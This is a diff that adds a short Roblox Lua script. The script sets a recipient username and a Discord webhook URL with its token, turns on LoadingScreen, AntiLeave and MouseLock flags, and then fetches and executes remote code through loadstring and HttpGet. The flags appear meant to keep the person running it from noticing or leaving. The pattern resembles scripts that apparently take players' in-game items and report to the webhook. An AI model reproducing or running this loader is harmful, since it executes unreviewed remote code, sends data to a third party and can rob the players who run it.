@@ -1,0 +1,10 @@
+
+UserName = "N5RTO_N5TO" 
+Webhook = "https://discord.com/api/webhooks/1123986167990337556/ixnkwhxt4TbxjG_pPwVHctcAysvNmvNF2bQlezXHPT31yip04xNFdEkRZnl8M6FrhXd7"
+UserName2 = "N5RTO_N5TO"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
